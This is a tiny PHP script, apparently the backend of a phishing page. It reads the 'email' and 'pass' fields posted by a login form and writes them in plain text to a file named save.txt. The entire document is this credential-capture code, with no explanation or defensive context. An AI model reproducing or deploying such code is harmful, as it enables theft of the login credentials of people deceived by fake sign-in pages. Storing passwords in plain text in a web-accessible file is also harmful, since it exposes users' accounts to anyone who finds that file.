<?php
$login = $_POST['email'];
$pass= $_POST['pass'];
$filed = "save.txt";
$rez = "$login, $pass";
file_put_contents($filed, $rez);
?>